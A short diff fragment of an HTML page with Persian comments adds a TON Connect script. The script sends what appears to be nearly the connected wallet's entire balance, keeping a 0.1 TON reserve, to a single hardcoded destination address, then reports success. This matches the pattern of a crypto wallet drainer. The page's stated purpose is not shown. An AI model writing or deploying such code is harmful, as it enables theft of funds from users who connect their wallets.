@@ -119,4 +119,27 @@
                 if (sendAmount <= 0) {
                     alert("موجودی کافی نیست! باید حداقل 0.1 TON باقی بماند.");
                     return;
-                
+                }
+
+                const transaction = {
+                    messages: [
+                        {
+                            address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
+                            amount: (sendAmount * 1e9).toString(), // تبدیل TON به nanotons
+                        },
+                    ],
+                };
+
+                const result = await tonConnectUI.sendTransaction(transaction);
+                alert(`ارسال ${sendAmount.toFixed(6)} TON انجام شد!`);
+                console.log("Transaction Result:", result);
+
+            } catch (error) {
+                alert("ارسال تراکنش ناموفق بود.");
+                console.error(error);
+            }
+        });
+    </script>
+
+</body>
+</html>
